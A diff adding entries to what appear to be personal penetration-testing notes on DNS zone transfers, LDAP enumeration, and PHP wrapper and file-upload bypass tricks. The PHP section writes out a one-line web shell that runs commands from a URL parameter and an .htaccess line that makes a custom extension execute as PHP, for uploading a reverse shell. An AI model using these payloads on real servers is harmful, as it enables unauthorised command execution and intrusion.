@@ -98,3 +98,22 @@
 
 # OpenVPN
 - avoild collision: add ``` mssfix 1400 ``` to openvpn file
+
+# DNS 
+- DNS Zone transfer
+- https://yogesh-verma.medium.com/zone-transfer-attacks-a-practical-guide-to-detection-and-prevention-2e8346d0297e
+- Only works in tcp
+
+# LDAP
+1. LDAPsearch (kali)
+
+# Php
+## PHP Wrappers
+- some uncommon method
+    1. ``` php://filter ```
+    2. make command base64 ``` <?php echo system($_GET["cmd"]);?> ```
+    3. insert ``` data:// ```
+## Advanced PHP Bypass 
+- not just using filetype alternatives
+1. upload htaccess with this ``` echo "AddType application/x-httpd-php .dork" > .htaccess ```
+2. upload shell.dork with reverse shell content (maybe Ivan Sincek?)
